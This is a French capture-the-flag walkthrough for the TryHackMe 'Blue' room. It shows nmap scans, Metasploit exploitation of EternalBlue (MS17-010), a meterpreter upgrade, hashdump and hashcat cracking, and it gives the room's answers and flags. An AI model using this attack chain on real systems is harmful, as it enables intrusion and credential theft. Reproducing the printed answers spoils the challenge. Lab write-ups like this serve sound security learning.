# Blue

> Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.


## NOTE: 
* Il est préférable d'avoir fait le [tuto Metasploit](https://tryhackme.com/room/rpmetasploit) avant :)

# [Task 1] Recon 

## #1 Scan the machine.

Ouvrir un nouveau terminal

### Attendre que la machine soit UP

```sh
mkdir blue
cd blue
export IP=10.10.51.199
ping $IP
```

### Recherche des ports ouvert, des services associés, ...

Dans la description il est indiqué que la machine ne réponds pas au ping.

On utilise donc l'option `-Pn` (No ping) et les options classiques `-sC` ([Script Scan](https://nmap.org/book/man-nse.html)) et `-sV` ([Probe open ports to determine service/version info](https://nmap.org/book/man-version-detection.html))

```sh
nmap -Pn -sC -sV -oN nmap.txt $IP
```
ou
```sh
nmap -sV -vv --script vuln -oN nmap.txt $IP
```

```
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```
```
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

## #2 How many ports are open with a port number under 1000?

> Réponse: 3

## #3 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

Ce tuto traite de la faille [EternalBlue](https://fr.wikipedia.org/wiki/EternalBlue) 

> **EternalBlue** est un exploit développé par la NSA. Il est révélé et publié par le groupe de hackers The Shadow Brokers le 14 avril 2017 
>
> Cet exploit utilise une faille de sécurité présente dans la première version du protocole SMB (**SMBv1)**. Bien que cette faille de sécurité ait déjà été résolue par Microsoft par une mise à jour de sécurité publiée le 14 mars 2017 ([MS17-010](https://docs.microsoft.com/fr-fr/security-updates/securitybulletins/2017/ms17-010)), de nombreux utilisateurs de Windows n'avaient toujours pas installé ce correctif de sécurité lorsque, le 12 mai 2017, le ransomware « WannaCry » utilise cette faille de sécurité pour se propager
>
> Cet exploit a également été utilisé pour les cyberattaques Adylkuzz (survenue quelques jours après WannaCry) et NotPetya (survenue le 27 juin 2017).
>
> -- *source: [wikipedia](https://fr.wikipedia.org/wiki/EternalBlue)* --

> Cette faille a été utilisée pendant 5 ans par la NSA ...

> Des détails (très) technique sont dispo [ici](https://research.checkpoint.com/2017/eternalblue-everything-know/https://research.checkpoint.com/2017/eternalblue-everything-know/)

On va utiliser l'option `-sC` ([Script Scan](https://nmap.org/book/man-nse.html)) de nmap en spécifiant les scripts concernant les vulnerabilités `smb`.

Vous pouvez trouver tous les scripts nmap dans le dossiers `/usr/share/nmap/scripts/`

```
locate *.nse |grep smb-vuln
/usr/share/nmap/scripts/smb-vuln-conficker.nse
/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
/usr/share/nmap/scripts/smb-vuln-webexec.nse
```


```
nmap --script smb-vuln* $IP
```

# [Task 2] Gain Access 

## #1 Start Metasploit

Si premiere execution de metasploit :
```sh
sudo msfdb init
```

Démarrage de la console metasploit :
```
msfconsole
```

## #2 Find the exploitation code we will run against the machine.

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

Il existe un module scanner :
* `auxiliary/scanner/smb/smb_ms17_010` 

et trois modules exploit :
* `exploit/windows/smb/ms17_010_eternalblue`
* `exploit/windows/smb/ms17_010_eternalblue_win8`
* `exploit/windows/smb/ms17_010_psexec`

Utilisation du scanner : 

```
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```

```
msf5 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)
```
La seule option opbligatoire et sans valeur par défaut est `RHOSTS`.


```
msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.
```

```
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
```

```
msf5 auxiliary(scanner/smb/smb_ms17_010) > back
```

Le scan nmap initial nous indique que la machine tourne sous Windows 7 donc on va utiliser le 1ier module exploit

> Réponse: **exploit/windows/smb/ms17_010_eternalblue**


## #3 Show options and set the one required value. What is the name of this value? (All caps for submission)

[optionnel] scan de la vulnerabilité

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

> Réponse: **RHOSTS**

## #4 Run the exploit!

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
```

Attendre, ça peut prendre quelques secondes ou nne pas marcher ...


Si fail :
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
```


## #5 Confirm that the exploit has run correctly.

```
C:\Windows\system32\whoami
```

# [Task 3] Escalate 

## #1 Convert a shell to meterpreter shell. What is the name of the post module we will use?

Le Windows c'est bien mais le shell [meterpreter](https://www.tntsecurite.ca/?p=1257) c'est mieux, on peut faire un tas de choses utiles avec (upload, download, post exploit) :)

Mise en arriere plan du shell (CTRL + Z ou "background")

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

```
sf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade

```

> Réponse: **post/multi/manage/shell_to_meterpreter**

## #2 Select this (use MODULE_PATH). Show options, what option are we required to change?

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter 
```
```
msf5 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

> Réponse: **SESSION**

## #3 Set the required option, you may need to list all of the sessions to find your target here.

```
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
```

## #4 Run! If this doesn't work, try completing the exploit from the previous task once more.

Cette opération va lancer une handler TCP sur Kali (netcat) et envoyer un exploit sur le serveur pour essayer d'upgader le shell.

```
msf5 post(multi/manage/shell_to_meterpreter) > run
```

> ça peut prendre quelques secondes, attendre le message "Stopping exploit/multi/handler"

*option rapide : *

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions -u 1
```

## #5 Once the meterpreter shell conversion completes, select that session for use.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 2
```

## #6 Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this.

```
meterpreter > getuid
```

Elevation de privilège "system" built-in (pas nécessaire ici, on est déja en system)
```
meterpreter > getsystem
```

Pour avoir un invite de commande msdos depuis meterpreter:
```
meterpreter > shell
```
CTRL+C

## #7 List all of the processes running via the 'ps' command.

## #8 Migrate to this process using the 'migrate PROCESS_ID' command

Permet d'attacher la sessions à un autre processus pour plus de stablilité.

> Le processus spoolsv.exe (spoolsv signifiant Printer Spooler Service, en français spouleur d'impression) est un processus générique de Windows NT/2000/XP servant à mettre en mémoire (file d'attente) les travaux d'impression. 
```
meterpreter > migrate <pid>
```

ou

> winlogon.exe gère les ouvertures de sessions, charge le profil d’un utilisateur après son authentification (userinit.exe) et gère l’écran de veille.
```
meterpreter > migrate -N winlogon.exe
```

# [Task 4] Cracking

## #1  Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user? 

meterpreter > hashdump

> Réponse: Jon

## #2 What is the cracked password?




https://hashcat.net/hashcat/

```
hashcat64.exe -m 0 jon.hash c:\tools\wordlits\rockyou.txt
```

> Réponse: **alqfna22**

# [Task 5] Find flags! 

## #1 Flag1? 

**Tips**: Can you C it?

```
meterpreter > pwd
C:\Windows\system32
meterpreter > cd /
meterpreter > dir
```

```
meterpreter > cat flag1.txt
```

> Réponse: **access_the_machine_**

## #2 Flag2?

**Tips**: I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.

https://www.google.com/search?q=where+windows+store+passwords

> All local user account passwords are stored inside windows. They are located inside C:\windows\system32\config\SAM

```
meterpreter > cd /Windows/system32/config
meterpreter > dir
```

```
meterpreter > cat flag2.txt
```

> Réponse: **sam_database_elevated_access**

## #3 flag3?

**Tips**: You'll need to have elevated privileges to access this flag. 

```
meterpreter > search -f flag*.txt
```


```
meterpreter > cat c:/Users/Jon/Documents/flag3.txt
```

> Réponse: **admin_documents_can_be_valuable**